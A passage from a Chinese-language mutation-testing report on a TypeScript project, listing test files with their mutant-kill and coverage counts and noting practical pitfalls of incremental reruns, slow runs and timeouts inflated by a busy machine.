- src/daemon/wiring/pipeline-deps-converse.test.ts(能杀 0,覆盖 1)
- src/daemon/wiring/pipeline-deps-delegate-selfid.test.ts(能杀 0,覆盖 1)
- src/daemon/wiring/pipeline-deps-guest-access.test.ts(能杀 0,覆盖 1)
- src/daemon/wiring/pipeline-deps-guest-dispatch.test.ts(能杀 0,覆盖 1)
- src/daemon/wiring/pipeline-deps-llm-down-commands.test.ts(能杀 0,覆盖 1)
- src/daemon/wiring/pipeline-deps-native-history.test.ts(能杀 0,覆盖 1)
- src/daemon/wiring/pipeline-deps-pairing-dispatch.test.ts(能杀 0,覆盖 1)
- src/daemon/wiring/pipeline-deps-pet.test.ts(能杀 0,覆盖 1)
- src/daemon/wiring/pipeline-deps-phone-chat.test.ts(能杀 0,覆盖 1)
- src/daemon/wiring/pipeline-deps-social-dispatch.test.ts(能杀 0,覆盖 1)
- src/daemon/wiring/pipeline-deps.degraded.test.ts(能杀 0,覆盖 1)

#### 工作台准入与补充(admission + inputs)

```
bun tools/mutation/unique-kills.ts reports/mutation/inc/adm-after.json reports/mutation/inc/inputs-after.json 
```

唯一杀为 0、但跑到过目标代码的测试文件(43 个;另有 25 个被牵连进来、一行目标代码都没跑到,不列):
- src/features/phone/settings-panel-workbench.test.ts(能杀 114,覆盖 214)
- src/features/workbench/service-attachments.test.ts(能杀 91,覆盖 166)
- src/features/workbench/service-background.test.ts(能杀 89,覆盖 188)
- src/features/workbench/service-review-actions.test.ts(能杀 77,覆盖 168)
- src/features/workbench/service-review.test.ts(能杀 77,覆盖 168)
- src/app/matters/service-attachments.test.ts(能杀 71,覆盖 143)
- src/features/workbench/api-task.integration.test.ts(能杀 60,覆盖 88)
- src/features/workbench/wechat-task-notifications.test.ts(能杀 56,覆盖 133)
- src/features/workbench/service-recollect.test.ts(能杀 41,覆盖 140)
- src/features/workbench/service-report.test.ts(能杀 40,覆盖 140)
- src/features/workbench/handoff.test.ts(能杀 39,覆盖 62)
- src/features/phone/phone-api-schema.test.ts(能杀 38,覆盖 111)
- src/features/workbench/native-adoption.test.ts(能杀 34,覆盖 66)
- src/features/workbench/routes.test.ts(能杀 32,覆盖 70)
- src/features/workbench/service-lease.test.ts(能杀 31,覆盖 51)
- src/features/workbench/wire-notifications.test.ts(能杀 30,覆盖 84)
- src/features/workbench/service-rewind.test.ts(能杀 26,覆盖 62)
- src/features/workbench/wechat-create.test.ts(能杀 24,覆盖 58)
- src/features/workbench/service/execute.test.ts(能杀 24,覆盖 57)
- src/features/workbench/timeline-service.test.ts(能杀 21,覆盖 82)
- src/features/workbench/wire.test.ts(能杀 16,覆盖 29)
- src/features/workbench/service-checkpoints-deadline.test.ts(能杀 13,覆盖 64)
- src/features/workbench/service-checkpoints.test.ts(能杀 13,覆盖 62)
- src/features/workbench/routes-quota-handoff.test.ts(能杀 13,覆盖 57)
- src/features/workbench/service/entry.test.ts(能杀 13,覆盖 27)
- src/features/phone/phone-quota-handoff.test.ts(能杀 11,覆盖 57)
- src/features/workbench/service-network-suspend.test.ts(能杀 11,覆盖 57)
- src/features/workbench/service-phase.test.ts(能杀 11,覆盖 57)
- src/features/workbench/service-review-lines.test.ts(能杀 11,覆盖 57)
- src/features/workbench/service-usage.test.ts(能杀 11,覆盖 57)
- src/features/workbench/service-provider-code.test.ts(能杀 11,覆盖 53)
- src/features/workbench/service-matters.test.ts(能杀 11,覆盖 51)
- src/features/workbench/service-quota.test.ts(能杀 11,覆盖 51)
- src/features/workbench/service-turn-artifacts.test.ts(能杀 11,覆盖 51)
- src/features/workbench/service-lessons.test.ts(能杀 11,覆盖 25)
- src/features/workbench/service-origin.test.ts(能杀 11,覆盖 19)
- src/features/workbench/service/quota-handoff.test.ts(能杀 11,覆盖 19)
- src/daemon/wiring/pipeline-deps-converse.test.ts(能杀 3,覆盖 33)
- src/features/workbench/wechat-artifact-delivery.test.ts(能杀 3,覆盖 12)
- src/features/reminders/reminders.e2e.test.ts(能杀 2,覆盖 4)
- src/features/workbench/native-history-recent.test.ts(能杀 2,覆盖 4)
- src/features/workbench/native-history-service.test.ts(能杀 2,覆盖 4)
- src/features/workbench/wire-artifacts.test.ts(能杀 2,覆盖 4)



### 跑的时候撞到的

1. **补完测试后用增量重跑,原来活着的变异会被原样沿用**。`reply-delivery` 那份补了 21 条用例,增量重跑出来 110 个活变异一个没少(手工改坏其中一处,新用例当场红);`turn-reply` 的 7 个模块级正则(静态变异)同样。增量判断「要不要重测」看的是覆盖它的旧测试改没改,新加的测试杀不杀得了一个原来活着的变异,它看不见。**补测试后的复跑:先把增量文件里 `Survived` / `NoCoverage` 的条目删掉**(只加了测试,被杀的不会变活),或者 `--force`。
2. 工作台三份(`admission` / `inputs` / `lifecycle`)不 bail 很慢:每个变异要把牵连到的 900 多条工作台测试里覆盖它的全跑完,`admission` 121 个变异 57 分钟,`lifecycle` 638 个预计五个小时。
3. `lifecycle` 第一次跑到 37% 时主人开始用机器(CPU 空闲掉到 11%),超时从 19 / 78 涨到 85 / 210 —— 机器忙把正常变异判成 Timeout(算「护住」,虚高)。中断后删掉增量里的 Timeout 条目,等空闲再接着跑。`vm.loadavg` 在这台机器上读数乱跳(同一秒 4 和 900),等空闲改看 `iostat` 的 CPU 空闲。
